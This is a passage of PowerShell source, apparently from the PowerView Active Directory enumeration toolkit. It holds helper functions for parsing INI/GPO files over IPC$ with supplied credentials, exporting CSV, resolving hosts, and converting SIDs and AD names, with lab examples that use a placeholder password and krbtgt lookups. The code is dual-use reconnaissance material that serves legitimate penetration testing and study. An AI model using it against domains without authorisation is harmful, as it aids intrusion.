$null), fallback to the PowerShell's -ne operator\n                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {\n                                    $_.Key\n                                }\n                            }\n                        }\n            if($StaleKeys) {\n                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}\n            }\n\n            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters\n            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |\n                                        # Find parameters that are belong to the current parameter set\n                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |\n                                            Select-Object -ExpandProperty Key |\n                                                # Find unbound parameters in the current parameter set\n                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }\n\n            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)\n            $tmp = $null\n            ForEach ($Parameter in $UnboundParameters) {\n                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0\n                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {\n                    $PSBoundParameters.$Parameter = $DefaultValue\n                }\n            }\n\n            if($Dictionary) {\n                $DPDictionary = $Dictionary\n            }\n            else {\n                $DPDictionary = $InternalDictionary\n            }\n\n            # Shortcut for getting local variables\n            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}\n\n            # Strings to match attributes and validation arguments\n            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'\n            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'\n            $AliasRegex = '^Alias$'\n            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute\n\n            switch -regex ($PSBoundParameters.Keys) {\n                $AttributeRegex {\n                    Try {\n                        $ParameterAttribute.$_ = . $GetVar\n                    }\n                    Catch {\n                        $_\n                    }\n                    continue\n                }\n            }\n\n            if($DPDictionary.Keys -contains $Name) {\n                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)\n            }\n            else {\n                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]\n                switch -regex ($PSBoundParameters.Keys) {\n                    $ValidationRegex {\n                        Try {\n                            $ParameterOptions = New-Object -TypeName \"System.Management.Automation.${_}Attribute\" -ArgumentList (. $GetVar) -ErrorAction Stop\n                            $AttributeCollection.Add($ParameterOptions)\n                        }\n                        Catch { $_ }\n                        continue\n                    }\n                    $AliasRegex {\n                        Try {\n                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop\n                            $AttributeCollection.Add($ParameterAlias)\n                            continue\n                        }\n                        Catch { $_ }\n                    }\n                }\n                $AttributeCollection.Add($ParameterAttribute)\n                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)\n                $DPDictionary.Add($Name, $Parameter)\n            }\n        }\n    }\n\n    End {\n        if(!$CreateVariables -and !$Dictionary) {\n            $DPDictionary\n        }\n    }\n}\n\n\nfunction Get-IniContent {\n<#\n.SYNOPSIS\n\nThis helper parses an .ini file into a hashtable.\n\nAuthor: 'The Scripting Guys'\nModifications: @harmj0y (-Credential support)\nLicense: BSD 3-Clause\nRequired Dependencies: Add-RemoteConnection, Remove-RemoteConnection\n\n.DESCRIPTION\n\nParses an .ini file into a hashtable. If -Credential is supplied,\nthen Add-RemoteConnection is used to map \\\\COMPUTERNAME\\IPC$, the file\nis parsed, and then the connection is destroyed with Remove-RemoteConnection.\n\n.PARAMETER Path\n\nSpecifies the path to the .ini file to parse.\n\n.PARAMETER OutputObject\n\nSwitch. Output a custom PSObject instead of a hashtable.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system.\n\n.EXAMPLE\n\nGet-IniContent C:\\Windows\\example.ini\n\n.EXAMPLE\n\n\"C:\\Windows\\example.ini\" | Get-IniContent -OutputObject\n\nOutputs the .ini details as a proper nested PSObject.\n\n.EXAMPLE\n\n\"C:\\Windows\\example.ini\" | Get-IniContent\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-IniContent -Path \\\\PRIMARY.testlab.local\\C$\\Temp\\GptTmpl.inf -Credential $Cred\n\n.INPUTS\n\nString\n\nAccepts one or more .ini paths on the pipeline.\n\n.OUTPUTS\n\nHashtable\n\nOuputs a hashtable representing the parsed .ini file.\n\n.LINK\n\nhttps://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([Hashtable])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('FullName', 'Name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Path,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $OutputObject\n    )\n\n    BEGIN {\n        $MappedComputers = @{}\n    }\n\n    PROCESS {\n        ForEach ($TargetPath in $Path) {\n            if (($TargetPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {\n                $HostComputer = (New-Object System.Uri($TargetPath)).Host\n                if (-not $MappedComputers[$HostComputer]) {\n                    # map IPC$ to this computer if it's not already\n                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential\n                    $MappedComputers[$HostComputer] = $True\n                }\n            }\n\n            if (Test-Path -Path $TargetPath) {\n                if ($PSBoundParameters['OutputObject']) {\n                    $IniObject = New-Object PSObject\n                }\n                else {\n                    $IniObject = @{}\n                }\n                Switch -Regex -File $TargetPath {\n                    \"^\\[(.+)\\]\" # Section\n                    {\n                        $Section = $matches[1].Trim()\n                        if ($PSBoundParameters['OutputObject']) {\n                            $Section = $Section.Replace(' ', '')\n                            $SectionObject = New-Object PSObject\n                            $IniObject | Add-Member Noteproperty $Section $SectionObject\n                        }\n                        else {\n                            $IniObject[$Section] = @{}\n                        }\n                        $CommentCount = 0\n                    }\n                    \"^(;.*)$\" # Comment\n                    {\n                        $Value = $matches[1].Trim()\n                        $CommentCount = $CommentCount + 1\n                        $Name = 'Comment' + $CommentCount\n                        if ($PSBoundParameters['OutputObject']) {\n                            $Name = $Name.Replace(' ', '')\n                            $IniObject.$Section | Add-Member Noteproperty $Name $Value\n                        }\n                        else {\n                            $IniObject[$Section][$Name] = $Value\n                        }\n                    }\n                    \"(.+?)\\s*=(.*)\" # Key\n                    {\n                        $Name, $Value = $matches[1..2]\n                        $Name = $Name.Trim()\n                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }\n\n                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }\n\n                        if ($PSBoundParameters['OutputObject']) {\n                            $Name = $Name.Replace(' ', '')\n                            $IniObject.$Section | Add-Member Noteproperty $Name $Values\n                        }\n                        else {\n                            $IniObject[$Section][$Name] = $Values\n                        }\n                    }\n                }\n                $IniObject\n            }\n        }\n    }\n\n    END {\n        # remove the IPC$ mappings\n        $MappedComputers.Keys | Remove-RemoteConnection\n    }\n}\n\n\nfunction Export-PowerViewCSV {\n<#\n.SYNOPSIS\n\nConverts objects into a series of comma-separated (CSV) strings and saves the\nstrings in a CSV file in a thread-safe manner.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis helper exports an -InputObject to a .csv in a thread-safe manner\nusing a mutex. This is so the various multi-threaded functions in\nPowerView has a thread-safe way to export output to the same file.\nUses .NET IO.FileStream/IO.StreamWriter objects for speed.\n\nOriginally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590\n\n.PARAMETER InputObject\n\nSpecifies the objects to export as CSV strings.\n\n.PARAMETER Path\n\nSpecifies the path to the CSV output file.\n\n.PARAMETER Delimiter\n\nSpecifies a delimiter to separate the property values. The default is a comma (,)\n\n.PARAMETER Append\n\nIndicates that this cmdlet adds the CSV output to the end of the specified file.\nWithout this parameter, Export-PowerViewCSV replaces the file contents without warning.\n\n.EXAMPLE\n\nGet-DomainUser | Export-PowerViewCSV -Path \"users.csv\"\n\n.EXAMPLE\n\nGet-DomainUser | Export-PowerViewCSV -Path \"users.csv\" -Append -Delimiter '|'\n\n.INPUTS\n\nPSObject\n\nAccepts one or more PSObjects on the pipeline.\n\n.LINK\n\nhttp://poshcode.org/1590\nhttp://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [System.Management.Automation.PSObject[]]\n        $InputObject,\n\n        [Parameter(Mandatory = $True, Position = 1)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Path,\n\n        [Parameter(Position = 2)]\n        [ValidateNotNullOrEmpty()]\n        [Char]\n        $Delimiter = ',',\n\n        [Switch]\n        $Append\n    )\n\n    BEGIN {\n        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])\n        $Exists = [System.IO.File]::Exists($OutputPath)\n\n        # mutex so threaded code doesn't stomp on the output file\n        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'\n        $Null = $Mutex.WaitOne()\n\n        if ($PSBoundParameters['Append']) {\n            $FileMode = [System.IO.FileMode]::Append\n        }\n        else {\n            $FileMode = [System.IO.FileMode]::Create\n            $Exists = $False\n        }\n\n        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)\n        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)\n        $CSVWriter.AutoFlush = $True\n    }\n\n    PROCESS {\n        ForEach ($Entry in $InputObject) {\n            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation\n\n            if (-not $Exists) {\n                # output the object field names as well\n                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }\n                $Exists = $True\n            }\n            else {\n                # only output object field data\n                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }\n            }\n        }\n    }\n\n    END {\n        $Mutex.ReleaseMutex()\n        $CSVWriter.Dispose()\n        $CSVStream.Dispose()\n    }\n}\n\n\nfunction Resolve-IPAddress {\n<#\n.SYNOPSIS\n\nResolves a given hostename to its associated IPv4 address.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nResolves a given hostename to its associated IPv4 address using\n[Net.Dns]::GetHostEntry(). If no hostname is provided, the default\nis the IP address of the localhost.\n\n.EXAMPLE\n\nResolve-IPAddress -ComputerName SERVER\n\n.EXAMPLE\n\n@(\"SERVER1\", \"SERVER2\") | Resolve-IPAddress\n\n.INPUTS\n\nString\n\nAccepts one or more IP address strings on the pipeline.\n\n.OUTPUTS\n\nSystem.Management.Automation.PSCustomObject\n\nA custom PSObject with the ComputerName and IPAddress.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.Management.Automation.PSCustomObject')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = $Env:COMPUTERNAME\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            try {\n                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {\n                    if ($_.AddressFamily -eq 'InterNetwork') {\n                        $Out = New-Object PSObject\n                        $Out | Add-Member Noteproperty 'ComputerName' $Computer\n                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString\n                        $Out\n                    }\n                }\n            }\n            catch {\n                Write-Verbose \"[Resolve-IPAddress] Could not resolve $Computer to an IP Address.\"\n            }\n        }\n    }\n}\n\n\nfunction ConvertTo-SID {\n<#\n.SYNOPSIS\n\nConverts a given user/group name to a security identifier (SID).\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  \n\n.DESCRIPTION\n\nConverts a \"DOMAIN\\username\" syntax to a security identifier (SID)\nusing System.Security.Principal.NTAccount's translate function. If alternate\ncredentials are supplied, then Get-ADObject is used to try to map the name\nto a security identifier.\n\n.PARAMETER ObjectName\n\nThe user/group name to convert, can be 'user' or 'DOMAIN\\user' format.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the translation, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the translation.\n\n.PARAMETER Credential\n\nSpecifies an alternate credential to use for the translation.\n\n.EXAMPLE\n\nConvertTo-SID 'DEV\\dfm'\n\n.EXAMPLE\n\n'DEV\\dfm','DEV\\krbtgt' | ConvertTo-SID\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n'TESTLAB\\dfm' | ConvertTo-SID -Credential $Cred\n\n.INPUTS\n\nString\n\nAccepts one or more username specification strings on the pipeline.\n\n.OUTPUTS\n\nString\n\nA string representing the SID of the translated name.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([String])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name', 'Identity')]\n        [String[]]\n        $ObjectName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $DomainSearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        ForEach ($Object in $ObjectName) {\n            $Object = $Object -Replace '/','\\'\n\n            if ($PSBoundParameters['Credential']) {\n                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments\n                if ($DN) {\n                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                    $UserName = $DN.Split(',')[0].split('=')[1]\n\n                    $DomainSearcherArguments['Identity'] = $UserName\n                    $DomainSearcherArguments['Domain'] = $UserDomain\n                    $DomainSearcherArguments['Properties'] = 'objectsid'\n                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid\n                }\n            }\n            else {\n                try {\n                    if ($Object.Contains('\\')) {\n                        $Domain = $Object.Split('\\')[0]\n                        $Object = $Object.Split('\\')[1]\n                    }\n                    elseif (-not $PSBoundParameters['Domain']) {\n                        $DomainSearcherArguments = @{}\n                        $Domain = (Get-Domain @DomainSearcherArguments).Name\n                    }\n\n                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))\n                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value\n                }\n                catch {\n                    Write-Verbose \"[ConvertTo-SID] Error converting $Domain\\$Object : $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction ConvertFrom-SID {\n<#\n.SYNOPSIS\n\nConverts a security identifier (SID) to a group/user name.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Convert-ADName  \n\n.DESCRIPTION\n\nConverts a security identifier string (SID) to a group/user name\nusing Convert-ADName.\n\n.PARAMETER ObjectSid\n\nSpecifies one or more SIDs to convert.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the translation, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the translation.\n\n.PARAMETER Credential\n\nSpecifies an alternate credential to use for the translation.\n\n.EXAMPLE\n\nConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108\n\nTESTLAB\\harmj0y\n\n.EXAMPLE\n\n\"S-1-5-21-890171859-3433809279-3366196753-1107\", \"S-1-5-21-890171859-3433809279-3366196753-1108\", \"S-1-5-32-562\" | ConvertFrom-SID\n\nTESTLAB\\WINDOWS2$\nTESTLAB\\harmj0y\nBUILTIN\\Distributed COM Users\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)\nConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred\n\nTESTLAB\\harmj0y\n\n.INPUTS\n\nString\n\nAccepts one or more SID strings on the pipeline.\n\n.OUTPUTS\n\nString\n\nThe converted DOMAIN\\username.\n#>\n\n    [OutputType([String])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('SID')]\n        [ValidatePattern('^S-1-.*')]\n        [String[]]\n        $ObjectSid,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $ADNameArguments = @{}\n        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        ForEach ($TargetSid in $ObjectSid) {\n            $TargetSid = $TargetSid.trim('*')\n            try {\n                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330\n                Switch ($TargetSid) {\n                    'S-1-0'         { 'Null Authority' }\n                    'S-1-0-0'       { 'Nobody' }\n                    'S-1-1'         { 'World Authority' }\n                    'S-1-1-0'       { 'Everyone' }\n                    'S-1-2'         { 'Local Authority' }\n                    'S-1-2-0'       { 'Local' }\n                    'S-1-2-1'       { 'Console Logon ' }\n                    'S-1-3'         { 'Creator Authority' }\n                    'S-1-3-0'       { 'Creator Owner' }\n                    'S-1-3-1'       { 'Creator Group' }\n                    'S-1-3-2'       { 'Creator Owner Server' }\n                    'S-1-3-3'       { 'Creator Group Server' }\n                    'S-1-3-4'       { 'Owner Rights' }\n                    'S-1-4'         { 'Non-unique Authority' }\n                    'S-1-5'         { 'NT Authority' }\n                    'S-1-5-1'       { 'Dialup' }\n                    'S-1-5-2'       { 'Network' }\n                    'S-1-5-3'       { 'Batch' }\n                    'S-1-5-4'       { 'Interactive' }\n                    'S-1-5-6'       { 'Service' }\n                    'S-1-5-7'       { 'Anonymous' }\n                    'S-1-5-8'       { 'Proxy' }\n                    'S-1-5-9'       { 'Enterprise Domain Controllers' }\n                    'S-1-5-10'      { 'Principal Self' }\n                    'S-1-5-11'      { 'Authenticated Users' }\n                    'S-1-5-12'      { 'Restricted Code' }\n                    'S-1-5-13'      { 'Terminal Server Users' }\n                    'S-1-5-14'      { 'Remote Interactive Logon' }\n                    'S-1-5-15'      { 'This Organization ' }\n                    'S-1-5-17'      { 'This Organization ' }\n                    'S-1-5-18'      { 'Local System' }\n                    'S-1-5-19'      { 'NT Authority' }\n                    'S-1-5-20'      { 'NT Authority' }\n                    'S-1-5-80-0'    { 'All Services ' }\n                    'S-1-5-32-544'  { 'BUILTIN\\Administrators' }\n                    'S-1-5-32-545'  { 'BUILTIN\\Users' }\n                    'S-1-5-32-546'  { 'BUILTIN\\Guests' }\n                    'S-1-5-32-547'  { 'BUILTIN\\Power Users' }\n                    'S-1-5-32-548'  { 'BUILTIN\\Account Operators' }\n                    'S-1-5-32-549'  { 'BUILTIN\\Server Operators' }\n                    'S-1-5-32-550'  { 'BUILTIN\\Print Operators' }\n                    'S-1-5-32-551'  { 'BUILTIN\\Backup Operators' }\n                    'S-1-5-32-552'  { 'BUILTIN\\Replicators' }\n                    'S-1-5-32-554'  { 'BUILTIN\\Pre-Windows 2000 Compatible Access' }\n                    'S-1-5-32-555'  { 'BUILTIN\\Remote Desktop Users' }\n                    'S-1-5-32-556'  { 'BUILTIN\\Network Configuration Operators' }\n                    'S-1-5-32-557'  { 'BUILTIN\\Incoming Forest Trust Builders' }\n                    'S-1-5-32-558'  { 'BUILTIN\\Performance Monitor Users' }\n                    'S-1-5-32-559'  { 'BUILTIN\\Performance Log Users' }\n                    'S-1-5-32-560'  { 'BUILTIN\\Windows Authorization Access Group' }\n                    'S-1-5-32-561'  { 'BUILTIN\\Terminal Server License Servers' }\n                    'S-1-5-32-562'  { 'BUILTIN\\Distributed COM Users' }\n                    'S-1-5-32-569'  { 'BUILTIN\\Cryptographic Operators' }\n                    'S-1-5-32-573'  { 'BUILTIN\\Event Log Readers' }\n                    'S-1-5-32-574'  { 'BUILTIN\\Certificate Service DCOM Access' }\n                    'S-1-5-32-575'  { 'BUILTIN\\RDS Remote Access Servers' }\n                    'S-1-5-32-576'  { 'BUILTIN\\RDS Endpoint Servers' }\n                    'S-1-5-32-577'  { 'BUILTIN\\RDS Management Servers' }\n                    'S-1-5-32-578'  { 'BUILTIN\\Hyper-V Administrators' }\n                    'S-1-5-32-579'  { 'BUILTIN\\Access Control Assistance Operators' }\n                    'S-1-5-32-580'  { 'BUILTIN\\Access Control Assistance Operators' }\n                    Default {\n                        Convert-ADName -Identity $TargetSid @ADNameArguments\n                    }\n                }\n            }\n            catch {\n                Write-Verbose \"[ConvertFrom-SID] Error converting SID '$TargetSid' : $_\"\n            }\n        }\n    }\n}\n\n\nfunction Convert-ADName {\n<#\n.SYNOPSIS\n\nConverts Active Directory object names between a variety of formats.\n\nAuthor: Bill Stewart, Pasquale Lantella  \nModifications: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)\nand translates Active Directory names between various formats using the NameTranslate COM object.\n\n.PARAMETER Identity\n\nSpecifies the Active Directory object name to translate, of the following form:\n\n    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'\n    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'\n    NT4               domain\\username; e.g., 'fabrikam\\pflynn'\n    Display           display name, e.g. 'pflynn'\n    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'\n    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'\n    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'\n    UPN               user principal name; e.g., 'pflynn@fabrikam.com'\n    CanonicalEx       extended canonical name format\n    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'\n    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'\n\n.PARAMETER OutputType\n\nSpecifies the output name type you want to convert to, which must be one of the following:\n\n    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'\n    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'\n    NT4               domain\\username; e.g., 'fabrikam\\pflynn'\n    Display           display name, e.g. 'pflynn'\n    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'\n    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'\n    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'\n    UPN               user principal name; e.g., 'pflynn@fabrikam.com'\n    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'\n    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the translation, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the translation.\n\n.PARAMETER Credential\n\nSpecifies an alternate credential to use for the translation.\n\n.EXAMPLE\n\nConvert-ADName -Identity \"TESTLAB\\harmj0y\"\n\nharmj0y@testlab.local\n\n.EXAMPLE\n\n\"TESTLAB\\krbtgt\", \"CN=Administrator,CN=Users,DC=testlab,DC=local\" | Convert-ADName -OutputType Canonical\n\ntestlab.local/Users/krbtgt\ntestlab.local/Users/Administrator\n\n.EXAMPLE\n\nConvert-ADName -OutputType dn -Identity 'TESTLAB\\harmj0y' -Server PRIMARY.testlab.local\n\nCN=harmj0y,CN=Users,DC=testlab,DC=local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)\n'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred\n\nTESTLAB\\harmj0y\n\n.INPUTS\n\nString\n\nAccepts one or more objects name strings on the pipeline.\n\n.OUTPUTS\n\nString\n\nOutputs a string representing the converted name.\n\n.LINK\n\nhttp://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats\nhttps://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [OutputType([String])]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name', 'ObjectName')]\n        [String[]]\n        $Identity,\n\n        [String]\n        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]\n        $OutputType,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $NameTypes = @{\n            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com\n            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn\n            'NT4'               =   3  # fabrikam\\pflynn\n            'Display'           =   4  # pflynn\n            'DomainSimple'      =   5  # pflynn@fabrikam.com\n            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com\n            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}\n            'Unknown'           =   8  # unknown type - let the server do translation\n            'UPN'               =   9  # pflynn@fabrikam.com\n            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn\n            'SPN'               =   11 # HTTP/kairomac.contoso.com\n            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999\n        }\n\n        # accessor functions from Bill Stewart to simplify calls to NameTranslate\n        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {\n            $Output = $Null\n            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)\n            Write-Output $Output\n        }\n\n        function Get-Property([__ComObject] $Object, [String] $Property) {\n            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)\n        }\n\n        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {\n            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)\n        }\n\n        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx\n        if ($PSBoundParameters['Server']) {\n            $ADSInitType = 2\n            $InitName = $Server\n        }\n        elseif ($PSBoundParameters['Domain']) {\n            $ADSInitType = 1\n            $InitName = $Domain\n        }\n        elseif ($PSBoundParameters['Credential']) {\n            $Cred = $Credential.GetNetworkCredential()\n            $ADSInitType = 1\n            $InitName = $Cred.Domain\n        }\n        else {\n            # if no domain or server is specified, default to GC initialization\n            $ADSInitType = 3\n            $InitName = $Null\n        }\n    }\n\n    PROCESS {\n        ForEach ($TargetIdentity in $Identity) {\n            if (-not $PSBoundParameters['OutputType']) {\n                if ($TargetIdentity -match \"^[A-Za-z]+\\\\[A-Za-z ]+\") {\n                    $ADSOutputType = $NameTypes['DomainSimple']\n                }\n                else {\n                    $ADSOutputType = $NameTypes['NT4']\n                }\n            }\n            else {\n                $ADSOutputType = $NameTypes[$OutputType]\n            }\n\n            $Translate = New-Object -ComObject NameTranslate\n\n            if ($PSBoundParameters['Credential']) {\n                try {\n                    $Cred = $Credential.GetNetworkCredential()\n\n                    Invoke-Method $Translate 